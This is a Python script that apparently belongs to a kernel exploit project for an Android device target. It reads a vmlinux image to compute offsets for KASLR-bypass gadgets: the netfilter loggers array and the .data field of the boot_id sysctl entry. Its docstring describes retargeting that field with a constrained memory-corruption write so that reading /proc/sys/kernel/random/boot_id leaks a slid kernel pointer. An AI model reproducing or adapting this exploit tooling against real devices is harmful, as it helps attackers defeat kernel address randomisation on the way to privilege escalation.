#!/usr/bin/env python3
"""Derive the two KASLR slide-gadget addresses for the z3q target
from the boot.img-extracted vmlinux ELF (image-relative, no slide).

Gadget values needed by k40-base/src/slide.c (CFGOPS_4_19_STYLE path):
  SLIDE_LOGGERS_0_1        = &loggers[0][0]   (nf_log.c static array,
                          filled at runtime with &nfulnl_logger -> slid)
  SLIDE_RANDOM_BOOT_ID_DATA = &(random_table[boot_id entry].data) - the
                          ctl_table .data FIELD that the constrained
                          rb-erase write retargets; reading
                          /proc/sys/kernel/random/boot_id then hex-leaks
                          whatever .data now points at (the loggers slot).

boot_id entry identification: 4.19 struct ctl_table is 0x40 bytes;
.procname (offset 0) points at the string "boot_id", .data (offset 8)
holds &sysctl_bootid (the 16-byte .bss buffer).
"""
import subprocess, sys, struct

VMLINUX = sys.argv[1] if len(sys.argv) > 1 else "out/vmlinux"
BASE = 0xffffff8008080000
CTL_TABLE_SZ = 0x40

def nm_syms():
    out = subprocess.run(["nm", VMLINUX], capture_output=True, text=True).stdout
    syms = {}
    for line in out.splitlines():
        p = line.split()
        if len(p) == 3:
            syms.setdefault(p[2], int(p[0], 16))
    return syms

SEGS = []
def load_segments():
    with open(VMLINUX, "rb") as f:
        hdr = f.read(64)
        e_phoff = struct.unpack_from("<Q", hdr, 0x20)[0]
        e_phentsize = struct.unpack_from("<H", hdr, 0x36)[0]
        e_phnum = struct.unpack_from("<H", hdr, 0x38)[0]
        f.seek(e_phoff)
        for _ in range(e_phnum):
            ph = f.read(e_phentsize)
            p_type = struct.unpack_from("<I", ph, 0)[0]
            p_offset, p_vaddr, p_paddr, p_filesz, p_memsz = struct.unpack_from("<QQQQQ", ph, 8)
            if p_type == 1:
                SEGS.append((p_vaddr, p_filesz, p_offset))

def read(va, n):
    for vaddr, filesz, off in SEGS:
        if vaddr <= va < vaddr + filesz:
            with open(VMLINUX, "rb") as f:
                f.seek(off + va - vaddr)
                return f.read(n)
    return None

def read_cstr(va, maxlen=32):
    data = read(va, maxlen)
    if data is None:
        return None
    return data.split(b"\0")[0].decode(errors="replace")

def off(a):
    return a - BASE

load_segments()
syms = nm_syms()

nful = syms["nfulnl_logger"]
loggers = syms.get("loggers")
print(f"nfulnl_logger    : {nful:#x}  off {off(nful):#x}")
print(f"loggers          : {loggers:#x}  off {off(loggers):#x}  (delta to nfulnl {nful - loggers:+#x})")
print(f"SLIDE_LOGGERS_0_1_OFF = {off(loggers):#x}")
print(f"SLIDE_NFULNL_LOGGER_OFF = {off(nful):#x}")

# find the sysctl table holding boot_id
candidates = [n for n in syms if "random_table" in n or "random_sysctl" in n]
bootid_buf = syms.get("sysctl_bootid")
print(f"sysctl_bootid buf: {bootid_buf:#x}  off {off(bootid_buf):#x} (.bss)")
for c in candidates:
    print(f"table candidate  : {c} {syms[c]:#x}")

tbl_sym = syms.get("random_table") or (syms[candidates[0]] if candidates else None)
assert tbl_sym, "random_table symbol not found"

found = False
for i in range(64):
    entry = tbl_sym + i * CTL_TABLE_SZ
    raw = read(entry, CTL_TABLE_SZ)
    if raw is None:
        break
    procname_ptr, data_ptr, maxlen = struct.unpack_from("<QQi", raw, 0)
    if procname_ptr == 0 and data_ptr == 0:
        break
    name = read_cstr(procname_ptr) if procname_ptr > 0xFFFFFF0000000000 else None
    if name == "boot_id":
        # verify .data -> &sysctl_bootid
        ok = data_ptr == bootid_buf
        print(f"boot_id entry    : {entry:#x}  off {off(entry):#x}  idx {i}  data->sysctl_bootid: {ok}")
        print(f"SLIDE_RANDOM_BOOT_ID_DATA_OFF = {off(entry + 8):#x}   (.data field address)")
        found = True
        break
    else:
        print(f"  entry[{i:2d}]  procname={name!r}")
if not found:
    print("boot_id ctl_table entry NOT found")
